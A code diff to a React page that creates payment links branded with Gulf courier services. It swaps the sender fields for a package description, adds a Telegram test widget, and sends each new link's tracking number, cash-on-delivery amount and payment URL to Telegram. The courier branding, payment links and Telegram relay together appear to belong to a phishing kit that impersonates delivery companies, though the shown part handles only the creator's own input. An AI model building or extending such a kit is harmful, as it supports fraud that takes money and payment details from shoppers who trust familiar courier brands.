@@ -11,6 +11,8 @@ import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { Package, MapPin, DollarSign, Hash } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { sendToTelegram } from "@/lib/telegram";
+import TelegramTest from "@/components/TelegramTest";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -22,8 +24,7 @@ const CreateShippingLink = () => {
   
   const [selectedService, setSelectedService] = useState("");
   const [trackingNumber, setTrackingNumber] = useState("");
-  const [senderName, setSenderName] = useState("");
-  const [senderCity, setSenderCity] = useState("");
+  const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
   
   // Get selected service details and branding
@@ -57,12 +58,39 @@ const CreateShippingLink = () => {
           service_key: selectedService,
           service_name: selectedServiceData?.name || selectedService,
           tracking_number: trackingNumber,
-          sender_name: senderName,
-          sender_city: senderCity,
+          package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
         },
       });
       
+      // Send data to Telegram
+      const telegramResult = await sendToTelegram({
+        type: 'shipping_link_created',
+        data: {
+          tracking_number: trackingNumber,
+          service_name: selectedServiceData?.name || selectedService,
+          package_description: packageDescription,
+          cod_amount: parseFloat(codAmount) || 0,
+          country: countryData.nameAr,
+          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
+        },
+        timestamp: new Date().toISOString()
+      });
+
+      if (telegramResult.success) {
+        toast({
+          title: "تم الإرسال بنجاح",
+          description: "تم إرسال البيانات إلى التليجرام",
+        });
+      } else {
+        console.error('Telegram error:', telegramResult.error);
+        toast({
+          title: "تحذير",
+          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
+          variant: "destructive",
+        });
+      }
+
       // Navigate to payment page with service parameter
       navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
     } catch (error) {
@@ -84,6 +112,11 @@ const CreateShippingLink = () => {
   return (
     <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
+        {/* Telegram Test Component */}
+        <div className="mb-6">
+          <TelegramTest />
+        </div>
+        
         <div className="max-w-2xl mx-auto">
           <Card className="p-4 shadow-elevated">
             <div
@@ -154,29 +187,18 @@ const CreateShippingLink = () => {
                 />
               </div>
               
-              {/* Sender Info */}
-              <div className="grid grid-cols-2 gap-3">
-                <div>
-                  <Label className="mb-2 text-sm">اسم المرسل</Label>
-                  <Input
-                    value={senderName}
-                    onChange={(e) => setSenderName(e.target.value)}
-                    placeholder="الاسم"
-                    className="h-9 text-sm"
-                  />
-                </div>
-                <div>
-                  <Label className="mb-2 flex items-center gap-2 text-sm">
-                    <MapPin className="w-3 h-3" />
-                    مدينة المرسل
-                  </Label>
-                  <Input
-                    value={senderCity}
-                    onChange={(e) => setSenderCity(e.target.value)}
-                    placeholder="المدينة"
-                    className="h-9 text-sm"
-                  />
-                </div>
+              {/* Package Description */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <Package className="w-3 h-3" />
+                  وصف الطرد
+                </Label>
+                <Input
+                  value={packageDescription}
+                  onChange={(e) => setPackageDescription(e.target.value)}
+                  placeholder="مثال: ملابس، إلكترونيات"
+                  className="h-9 text-sm"
+                />
               </div>
               
               {/* COD Amount */}
